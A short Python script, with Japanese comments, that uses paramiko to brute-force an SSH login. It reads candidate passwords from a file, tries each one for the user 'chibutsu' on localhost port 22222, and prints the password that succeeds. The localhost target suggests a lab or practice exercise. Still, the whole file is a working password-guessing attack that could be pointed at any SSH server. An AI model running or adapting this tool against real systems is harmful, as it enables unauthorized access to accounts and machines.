import paramiko 
import time
import sys


passwords_path = "passwords.txt" # パスワードリストの場所

# ssh ユーザー名@localhost -p 22222
HOST = "localhost" # SSH接続先
PORT = 22222 # SSH接続のためのポート番号。今回は22222。
USER = "chibutsu" # ユーザー名

# パスワードリストからパスワードを読み込んでSSH接続を試みる。
# 接続が成功したらプログラムを終了させる。
# 失敗したら次のパスワードを試す。
with open(passwords_path, "r") as file:

    for PASSWORD in file:

        # 改行コードを取り除く
        PASSWORD = PASSWORD.replace("\n", "")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(hostname=HOST, port=PORT, username=USER, password=PASSWORD)
            print()
            print("SUCCESS!")
            print(f"username : {USER}")
            print(f"password : {PASSWORD}")

            sys.exit()
        except paramiko.AuthenticationException:
            print(f"{PASSWORD} is not correct")
        finally:
            ssh.close()


